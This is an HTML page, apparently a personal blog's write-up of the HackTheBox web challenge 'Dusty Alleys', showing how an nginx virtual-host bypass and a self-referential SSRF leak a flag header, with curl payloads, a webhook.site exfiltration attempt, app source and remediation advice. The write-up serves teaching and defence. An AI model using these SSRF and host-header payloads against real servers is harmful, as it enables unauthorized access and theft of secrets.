@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dusty Alleys — HTB CTF Writeup | Abdelaaziz Belkhair</title>
+    <meta name="description"
+        content="HTB CTF Writeup: Dusty Alleys — Nginx virtual host bypass + SSRF header reflection to capture the flag.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+    <style>
+        :root {
+            --primary: #00d4ff;
+            --accent: #ff6b6b;
+            --success: #00ff88;
+            --bg: #0a0a0a;
+            --bg-card: #111111;
+            --bg-terminal: #0d0d0d;
+            --text: #e4e4e7;
+            --text-secondary: #a1a1aa;
+            --text-muted: #71717a;
+            --border: #27272a;
+            --orange: #f97316;
+            --purple: #a78bfa;
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.8;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        a {
+            color: var(--primary);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        a:hover {
+            color: var(--success);
+        }
+
+        /* ── Header ── */
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 24px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.75rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        main {
+            padding-top: 100px;
+            padding-bottom: 60px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .back-link:hover {
+            color: var(--primary);
+        }
+
+        /* ── Challenge Card (HTB-style) ── */
+        .challenge-card {
+            background: linear-gradient(135deg, rgba(249, 115, 22, 0.08) 0%, rgba(0, 212, 255, 0.04) 100%);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 2rem 2.5rem;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .challenge-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--orange), var(--primary), var(--purple));
+        }
+
+        .challenge-card::after {
+            content: '';
+            position: absolute;
+            top: -60px;
+            right: -60px;
+            width: 180px;
+            height: 180px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(249, 115, 22, 0.08) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .challenge-platform {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--success);
+            background: rgba(0, 255, 136, 0.1);
+            padding: 0.3rem 0.75rem;
+            border-radius: 20px;
+            margin-bottom: 1rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .challenge-title {
+            font-size: 2.2rem;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, var(--text) 0%, var(--text-secondary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .challenge-subtitle {
+            color: var(--text-secondary);
+            font-size: 1.05rem;
+            margin-bottom: 1.5rem;
+            max-width: 650px;
+        }
+
+        .challenge-meta {
+            display: flex;
+            gap: 0.6rem;
+            flex-wrap: wrap;
+            margin-bottom: 1.5rem;
+        }
+
+        .meta-badge {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            padding: 0.3rem 0.7rem;
+            border-radius: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            font-weight: 600;
+        }
+
+        .meta-badge.date {
+            color: var(--primary);
+            background: rgba(0, 212, 255, 0.12);
+        }
+
+        .meta-badge.category {
+            color: var(--purple);
+            background: rgba(167, 139, 250, 0.12);
+        }
+
+        .meta-badge.tag {
+            color: var(--orange);
+            background: rgba(249, 115, 22, 0.12);
+        }
+
+        .challenge-stats {
+            display: flex;
+            gap: 1px;
+            background: var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-top: 0.5rem;
+        }
+
+        .stat-item {
+            flex: 1;
+            padding: 1rem;
+            text-align: center;
+            background: var(--bg-card);
+        }
+
+        .stat-item:first-child {
+            border-radius: 12px 0 0 12px;
+        }
+
+        .stat-item:last-child {
+            border-radius: 0 12px 12px 0;
+        }
+
+        .stat-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.3rem;
+            font-weight: 700;
+            display: block;
+        }
+
+        .stat-value.difficulty-medium {
+            color: var(--orange);
+        }
+
+        .stat-value.difficulty-hard {
+            color: var(--accent);
+        }
+
+        .stat-value.difficulty-easy {
+            color: var(--success);
+        }
+
+        .stat-value.impact {
+            color: var(--accent);
+        }
+
+        .stat-value.vulns {
+            color: var(--primary);
+        }
+
+        .stat-label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 0.25rem;
+        }
+
+        /* ── Table of Contents ── */
+        .toc {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.25rem 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .toc-title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .toc-title::before {
+            content: '';
+            width: 12px;
+            height: 2px;
+            background: var(--orange);
+        }
+
+        .toc ol {
+            list-style: none;
+            counter-reset: toc-counter;
+            padding: 0;
+            margin: 0;
+        }
+
+        .toc li {
+            counter-increment: toc-counter;
+            margin-bottom: 0.25rem;
+        }
+
+        .toc li a {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            padding: 0.35rem 0.5rem;
+            border-radius: 6px;
+            transition: all 0.15s;
+        }
+
+        .toc li a:hover {
+            color: var(--orange);
+            background: rgba(249, 115, 22, 0.06);
+        }
+
+        .toc li a::before {
+            content: counter(toc-counter, decimal-leading-zero);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            min-width: 20px;
+        }
+
+        /* ── Article Content ── */
+        .article-content h2 {
+            font-size: 1.35rem;
+            margin: 2.5rem 0 1rem;
+            color: var(--text);
+            padding-bottom: 0.6rem;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .article-content h2::before {
+            content: '';
+            width: 4px;
+            height: 22px;
+            background: var(--orange);
+            border-radius: 2px;
+            flex-shrink: 0;
+        }
+
+        .article-content h3 {
+            font-size: 1.1rem;
+            margin: 1.5rem 0 0.75rem;
+            color: var(--text);
+        }
+
+        .article-content h4 {
+            font-size: 0.95rem;
+            margin: 1.25rem 0 0.5rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content ul,
+        .article-content ol {
+            margin: 1rem 0;
+            padding-left: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        /* ── Code Blocks ── */
+        .article-content pre {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 1.25rem 1.25rem 1.25rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            line-height: 1.6;
+            position: relative;
+        }
+
+        .article-content pre::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--orange) 0%, transparent 100%);
+            border-radius: 10px 10px 0 0;
+        }
+
+        .article-content code {
+            font-family: 'JetBrains Mono', monospace;
+            background: rgba(249, 115, 22, 0.1);
+            padding: 0.15rem 0.45rem;
+            border-radius: 4px;
+            font-size: 0.83em;
+            color: var(--orange);
+        }
+
+        .article-content pre code {
+            background: none;
+            padding: 0;
+            color: var(--text-secondary);
+        }
+
+        /* ── Info & Warning Boxes ── */
+        .info-box {
+            background: rgba(0, 212, 255, 0.06);
+            border: 1px solid rgba(0, 212, 255, 0.15);
+            border-left: 3px solid var(--primary);
+            padding: 1.25rem 1.5rem;
+            border-radius: 0 10px 10px 0;
+            margin: 1.5rem 0;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .warning-box {
+            background: rgba(255, 107, 107, 0.06);
+            border: 1px solid rgba(255, 107, 107, 0.15);
+            border-left: 3px solid var(--accent);
+            padding: 1.25rem 1.5rem;
+            border-radius: 0 10px 10px 0;
+            margin: 1.5rem 0;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        /* ── Tables ── */
+        table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0;
+            margin: 1.5rem 0;
+            font-size: 0.85rem;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+        }
+
+        th,
+        td {
+            padding: 0.7rem 1rem;
+            text-align: left;
+        }
+
+        th {
+            background: var(--bg-terminal);
+            color: var(--primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.78rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        td {
+            color: var(--text-secondary);
+            border-bottom: 1px solid rgba(39, 39, 42, 0.5);
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background: rgba(249, 115, 22, 0.03);
+        }
+
+        td code {
+            font-size: 0.8em;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 2rem 0;
+        }
+
+        /* ── Pwned Banner ── */
+        .pwned-banner {
+            text-align: center;
+            padding: 2.5rem 2rem;
+            margin: 3rem 0 1rem;
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.06) 0%, rgba(0, 212, 255, 0.04) 100%);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 16px;
+            position: relative;
+        }
+
+        .pwned-banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--success), var(--primary));
+        }
+
+        .pwned-icon {
+            font-size: 2.5rem;
+            margin-bottom: 0.75rem;
+            display: block;
+        }
+
+        .pwned-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--success);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .pwned-sub {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-top: 0.5rem;
+        }
+
+        /* ── Footer ── */
+        footer {
+            padding: 1.5rem 0;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .challenge-title {
+                font-size: 1.6rem;
+            }
+
+            .challenge-card {
+                padding: 1.5rem;
+            }
+
+            .challenge-stats {
+                flex-wrap: wrap;
+            }
+
+            .stat-item {
+                min-width: 80px;
+            }
+
+            table {
+                font-size: 0.75rem;
+            }
+
+            th,
+            td {
+                padding: 0.4rem 0.6rem;
+            }
+
+            .toc {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <nav>
+            <a href="../index.html" class="logo">AB_</a>
+            <ul class="nav-links">
+                <li><a href="../index.html">Accueil</a></li>
+                <li><a href="../blog.html">Blog</a></li>
+                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../index.html#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="container">
+        <a href="../writeups.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux writeups</a>
+
+        <article>
+            <div class="challenge-card">
+                <span class="challenge-platform"><i class="fas fa-flag"></i> HackTheBox CTF</span>
+                <h1 class="challenge-title">Dusty Alleys</h1>
+                <p class="challenge-subtitle">Nginx virtual host bypass + SSRF header reflection to uncover a hidden domain and capture the flag.</p>
+                <div class="challenge-meta">
+                    <span class="meta-badge date"><i class="fas fa-calendar"></i> 2026-02-14</span>
+                    <span class="meta-badge category">Web Exploitation</span>
+                    <span class="meta-badge tag">SSRF</span>
+                    <span class="meta-badge tag">Nginx Bypass</span>
+                    <span class="meta-badge tag">VHost</span>
+                </div>
+                <div class="challenge-stats">
+                    <div class="stat-item">
+                        <span class="stat-value difficulty-medium">Medium</span>
+                        <span class="stat-label">Difficulty</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value vulns">3</span>
+                        <span class="stat-label">Steps</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value impact">SSRF</span>
+                        <span class="stat-label">Impact</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value difficulty-medium">Nginx</span>
+                        <span class="stat-label">Stack</span>
+                    </div>
+                </div>
+            </div>
+
+            <nav class="toc">
+                <div class="toc-title">Table of Contents</div>
+                <ol>
+                    <li><a href="#s1">Initial Reconnaissance</a></li>
+                    <li><a href="#s2">Architecture Analysis</a></li>
+                    <li><a href="#s3">Discovering the Secret Domain</a></li>
+                    <li><a href="#s4">Exploitation — The SSRF Loop</a></li>
+                    <li><a href="#s5">Failed Approaches</a></li>
+                    <li><a href="#s6">Attack Chain Summary</a></li>
+                    <li><a href="#s7">Key Takeaways</a></li>
+                    <li><a href="#s8">Remediation</a></li>
+                </ol>
+            </nav>
+
+            <div class="article-content">
+
+                <div class="info-box">
+                    <strong>Challenge</strong>: Dusty Alleys<br>
+                    <strong>Category</strong>: Web Exploitation<br>
+                    <strong>Difficulty</strong>: Medium<br>
+                    <strong>Flag</strong>: <code>HTB{REDACTED}</code><br>
+                    <strong>Target</strong>: <code>http://154.57.164.70:30744</code>
+                </div>
+
+                <h2 id="s1">1. Initial Reconnaissance</h2>
+
+                <h3>The Landing Page</h3>
+
+                <p>The main page at <code>/</code> is a static HTML page themed as "The Underground Labyrinth" with an
+                    "Interact with the Robot" button. No JavaScript, no hidden endpoints — purely cosmetic. Nothing
+                    exploitable.</p>
+
+                <h3>Endpoint Discovery</h3>
+
+                <p>Running <strong>feroxbuster</strong> against the target reveals two accessible endpoints:</p>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Endpoint</th>
+                            <th>Response</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>/think</code></td>
+                            <td>200 OK</td>
+                            <td>Returns all request headers as JSON</td>
+                        </tr>
+                        <tr>
+                            <td><code>/alley</code></td>
+                            <td>200 OK</td>
+                            <td>Game page linking to <code>/guardian</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>/guardian</code></td>
+                            <td><strong>404</strong></td>
+                            <td>Blocked — returns nginx 404</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <p>The <code>/think</code> endpoint is immediately interesting — it echoes back <strong>all request
+                        headers</strong> as JSON. This is a deliberate debug/diagnostic endpoint:</p>
+
+                <pre><code>GET /think HTTP/1.1
+Host: 154.57.164.70:30744</code></pre>
+
+                <p>Response:</p>
+
+                <pre><code>{
+  "host": "154.57.164.70:30744",
+  "user-agent": "curl/8.13.0",
+  "accept": "*/*",
+  "x-forwarded-for": "45.xxx.xxx.xxx",
+  "x-forwarded-proto": "http",
+  "x-forwarded-host": "154.57.164.70:30744"
+}</code></pre>
+
+                <div class="info-box">
+                    <strong>Key observation</strong>: The presence of <code>X-Forwarded-For</code> and
+                    <code>X-Forwarded-Host</code> reveals a <strong>reverse proxy architecture</strong> — the request
+                    passes through nginx before reaching the backend.
+                </div>
+
+                <h2 id="s2">2. Architecture Analysis</h2>
+
+                <h3>Understanding the Stack</h3>
+
+                <p>From the Dockerfile and nginx configuration:</p>
+
+                <pre><code>┌─────────────────────────────────────────────────────────────┐
+│                        CLIENT                                │
+│                          │                                   │
+│                     ┌────▼────┐                              │
+│                     │  NGINX  │  (:80)                       │
+│                     │         │                              │
+│                     │ Routes: │                              │
+│                     │  /           → Express (:3000)         │
+│                     │  /think      → Express (:3000)         │
+│                     │  /alley      → Express (:3000)         │
+│                     │  /guardian   → 404 (blocked!)          │
+│                     └────┬────┘                              │
+│                          │                                   │
+│                     ┌────▼────┐                              │
+│                     │ Express │  (:3000) — "Dusty Alleys"   │
+│                     │         │                              │
+│                     │ Routes: │                              │
+│                     │  /           → Static landing page     │
+│                     │  /think      → Header reflection       │
+│                     │  /alley      → Game page               │
+│                     │  /guardian   → Flag endpoint!          │
+│                     └─────────┘                              │
+└─────────────────────────────────────────────────────────────┘</code></pre>
+
+                <h3>The Key Insight</h3>
+
+                <p>The Express app has a <code>/guardian</code> route that holds the flag. Nginx <strong>blocks direct
+                        access</strong> to <code>/guardian</code> (returns its own 404). But Express has the route — we
+                    need to reach Express's <code>/guardian</code> <strong>while bypassing nginx's block</strong>.</p>
+
+                <h3>Nginx Configuration</h3>
+
+                <pre><code>server {
+    listen 80 default_server;
+    server_name _;
+
+    location / {
+        proxy_pass http://app:3000;
+        proxy_set_header X-Forwarded-For $remote_addr;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_set_header X-Forwarded-Host $host;
+    }
+
+    location /guardian {
+        return 404;     # ← Hard 404
+    }
+}
+
+server {
+    listen 80;
+    server_name dusty-alleys.htb;     # ← Virtual host!
+
+    location / {
+        proxy_pass http://app:3000;
+        proxy_set_header Host dusty-alleys.htb;
+        # No /guardian block!
+    }
+}</code></pre>
+
+                <p>Two server blocks:</p>
+                <ol>
+                    <li><strong>Default server (<code>server_name _</code>)</strong>: Blocks <code>/guardian</code></li>
+                    <li><strong>Virtual host (<code>dusty-alleys.htb</code>)</strong>: <strong>Does NOT block
+                            <code>/guardian</code></strong></li>
+                </ol>
+
+                <p>If we send a request with <code>Host: dusty-alleys.htb</code>, nginx routes to the
+                    <strong>second</strong> server block, which proxies <strong>all</strong> routes (including
+                    <code>/guardian</code>) to Express.
+                </p>
+
+                <h3>Express Application (app.js)</h3>
+
+                <pre><code>const express = require('express');
+const axios = require('axios');
+const app = express();
+
+app.use(express.static('public'));
+
+// Header reflection
+app.get('/think', (req, res) =&gt; {
+    res.json(req.headers);
+});
+
+// Game page
+app.get('/alley', (req, res) =&gt; {
+    res.sendFile(__dirname + '/views/alley.html');
+});
+
+// Flag endpoint — requires domain and SSRF
+app.get('/guardian', async (req, res) =&gt; {
+    const domain = req.query.domain;
+    if (!domain) return res.send("Where are you going?");
+
+    try {
+        const resp = await axios.get(`http://${domain}/think`, {
+            headers: { 'X-Secret-Flag': process.env.FLAG }
+        });
+        res.json(resp.data);
+    } catch (e) {
+        res.status(500).send("The guardian blocks your path.");
+    }
+});</code></pre>
+
+                <div class="warning-box">
+                    <strong>Critical detail</strong>: <code>/guardian</code> takes a <code>domain</code> parameter,
+                    makes a request to <code>http://&lt;domain&gt;/think</code> with the <strong>flag in an
+                        X-Secret-Flag header</strong>, and returns the response. Since <code>/think</code> reflects all
+                    headers, pointing <code>domain</code> back to the app itself will echo the flag.
+                </div>
+
+                <h2 id="s3">3. Discovering the Secret Domain</h2>
+
+                <h3>How to Find <code>dusty-alleys.htb</code></h3>
+
+                <p>There are several ways the secret domain could be discovered:</p>
+
+                <ol>
+                    <li><strong>Source code analysis</strong>: The nginx config in the challenge source contains
+                        <code>server_name dusty-alleys.htb</code>
+                    </li>
+                    <li><strong>Header reflection</strong>: The <code>/think</code> endpoint shows
+                        <code>X-Forwarded-Host</code> — testing different Host headers reveals which ones produce
+                        different behavior
+                    </li>
+                    <li><strong><code>/alley</code> page hints</strong>: The game page's HTML/JS may contain references
+                        to the domain</li>
+                    <li><strong>Common CTF enumeration</strong>: Trying <code>&lt;challenge-name&gt;.htb</code> is
+                        standard HackTheBox practice</li>
+                </ol>
+
+                <h3>Confirming the Virtual Host</h3>
+
+                <pre><code>curl -H "Host: dusty-alleys.htb" http://154.57.164.70:30744/guardian
+# → "Where are you going?" (200 OK, not 404!)</code></pre>
+
+                <p>Without the Host header:</p>
+
+                <pre><code>curl http://154.57.164.70:30744/guardian
+# → nginx 404 page</code></pre>
+
+                <p><strong>The virtual host bypass works.</strong> We can now reach the <code>/guardian</code> endpoint.
+                </p>
+
+                <h2 id="s4">4. Exploitation — The SSRF Loop</h2>
+
+                <h3>Understanding the Attack</h3>
+
+                <p>The <code>/guardian</code> endpoint:</p>
+                <ol>
+                    <li>Takes a <code>domain</code> parameter</li>
+                    <li>Makes a GET request to <code>http://&lt;domain&gt;/think</code></li>
+                    <li>Attaches the flag as an <code>X-Secret-Flag</code> header</li>
+                    <li>Returns the response body</li>
+                </ol>
+
+                <p>Since <code>/think</code> echoes all request headers back as JSON, we can create a
+                    <strong>self-referential SSRF</strong>:
+                </p>
+                <ol>
+                    <li>Call <code>/guardian?domain=app:3000</code> (or <code>localhost:3000</code>)</li>
+                    <li><code>/guardian</code> calls <code>http://app:3000/think</code> with
+                        <code>X-Secret-Flag: HTB{...}</code>
+                    </li>
+                    <li><code>/think</code> reflects all headers including <code>X-Secret-Flag</code></li>
+                    <li><code>/guardian</code> returns the reflected JSON to us</li>
+                </ol>
+
+                <h3>The Final Payload</h3>
+
+                <pre><code>curl -H "Host: dusty-alleys.htb" \
+     "http://154.57.164.70:30744/guardian?domain=app:3000"</code></pre>
+
+                <p>Response:</p>
+
+                <pre><code>{
+  "host": "app:3000",
+  "user-agent": "axios/1.7.9",
+  "accept": "application/json, text/plain, */*",
+  "x-secret-flag": "HTB{REDACTED}",
+  "accept-encoding": "gzip, compress, deflate, br"
+}</code></pre>
+
+                <div class="info-box">
+                    <strong>Why <code>app:3000</code>?</strong> In Docker Compose, services are accessible by their
+                    service name. The Express app is named <code>app</code> in the Docker configuration, and it listens
+                    on port 3000. <code>localhost:3000</code> would also work since nginx and Express run in the same
+                    network namespace.
+                </div>
+
+                <h2 id="s5">5. Three Failed Approaches That Looked Promising</h2>
+
+                <h3>❌ Attempt 1: Direct URL manipulation</h3>
+
+                <pre><code># Trying to bypass nginx's /guardian block without virtual host
+curl http://154.57.164.70:30744/Guardian       # → 404 (case-sensitive match)
+curl http://154.57.164.70:30744//guardian       # → 404 (normalized)
+curl http://154.57.164.70:30744/./guardian      # → 404 (normalized)
+curl http://154.57.164.70:30744/guardian%00     # → 400 (null byte rejected)</code></pre>
+
+                <p><strong>Why it failed</strong>: nginx's <code>location /guardian</code> is a prefix match. Any path
+                    starting with <code>/guardian</code> gets caught. Path normalization collapses tricks like
+                    <code>//</code> and <code>/./</code>.
+                </p>
+
+                <h3>❌ Attempt 2: SSRF to external webhook</h3>
+
+                <pre><code>curl -H "Host: dusty-alleys.htb" \
+     "http://154.57.164.70:30744/guardian?domain=webhook.site/xxxx"</code></pre>
+
+                <p><strong>Why it failed</strong>: The container has no external network access (Docker network
+                    isolation). All outbound requests fail.</p>
+
+                <h3>❌ Attempt 3: Direct Express access</h3>
+
+                <pre><code>curl http://154.57.164.70:3000/guardian</code></pre>
+
+                <p><strong>Why it failed</strong>: Only nginx's port 80 is exposed to the outside. Express's port 3000
+                    is internal to the Docker network.</p>
+
+                <h2 id="s6">6. Attack Chain Summary</h2>
+
+                <pre><code>┌─────────────────────────────────────────────────────────────────┐
+│                   DUSTY ALLEYS EXPLOIT CHAIN                     │
+├──────────┬──────────────────────────────────────────────────────┤
+│ Step 1   │ Reconnaissance                                       │
+│          │ Discover /think (header reflection) and /alley        │
+│          │ Note /guardian returns nginx 404 (blocked)             │
+├──────────┼──────────────────────────────────────────────────────┤
+│ Step 2   │ Virtual Host Bypass                                   │
+│          │ Use Host: dusty-alleys.htb header                     │
+│          │ nginx routes to server block WITHOUT /guardian block   │
+│          │ → /guardian now returns 200!                           │
+├──────────┼──────────────────────────────────────────────────────┤
+│ Step 3   │ SSRF + Header Reflection                              │
+│          │ /guardian?domain=app:3000 makes internal request       │
+│          │ to /think with X-Secret-Flag header                   │
+│          │ /think echoes ALL headers → flag revealed              │
+└──────────┴──────────────────────────────────────────────────────┘</code></pre>
+
+                <h2 id="s7">7. Key Takeaways</h2>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Concept</th>
+                            <th>Lesson</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Virtual host enumeration</strong></td>
+                            <td>nginx routes requests based on the <code>Host</code> header. Different
+                                <code>server_name</code> blocks can have different security policies. Always enumerate
+                                virtual hosts.
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><strong>Inconsistent security layers</strong></td>
+                            <td>nginx blocked <code>/guardian</code> in the default server but not in the virtual host.
+                                Security must be consistent across all entry points.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Header reflection = SSRF goldmine</strong></td>
+                            <td>Debug endpoints that echo headers back (<code>/think</code>) can leak sensitive
+                                information when combined with SSRF.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Internal service names</strong></td>
+                            <td>Docker Compose service names (<code>app</code>) act as hostnames on the internal
+                                network. Understanding the deployment model helps craft SSRF payloads.</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Attack chaining</strong></td>
+                            <td>No single vulnerability was sufficient. The exploit required chaining virtual host
+                                bypass → SSRF → header reflection.</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h2 id="s8">8. Remediation</h2>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Vulnerability</th>
+                            <th>Fix</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Header reflection endpoint</td>
+                            <td>Remove <code>/think</code> in production. Never expose debug endpoints.</td>
+                        </tr>
+                        <tr>
+                            <td>Inconsistent nginx ACL</td>
+                            <td>Apply <code>location /guardian { return 404; }</code> to <strong>all</strong> server
+                                blocks, or use a shared <code>include</code> file for security rules.</td>
+                        </tr>
+                        <tr>
+                            <td>SSRF in <code>/guardian</code></td>
+                            <td>Don't make HTTP requests to user-controlled domains. If external calls are needed, use a
+                                strict allowlist.</td>
+                        </tr>
+                        <tr>
+                            <td>Secrets in headers</td>
+                            <td>Never pass secrets as HTTP headers in internal requests. Use environment variables or
+                                secure vaults accessed directly.</td>
+                        </tr>
+                        <tr>
+                            <td>Virtual host exposure</td>
+                            <td>Use <code>default_server</code> to catch-all and reject unknown Host headers. Only
+                                accept explicitly expected domains.</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="pwned-banner">
+                    <span class="pwned-icon">🏴</span>
+                    <div class="pwned-text">Machine Pwned</div>
+                    <p class="pwned-sub">VHost Bypass → SSRF → Flag captured</p>
+                </div>
+
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Abdelaaziz Belkhair</p>
+        </div>
+    </footer>
+</body>
+
+</html>
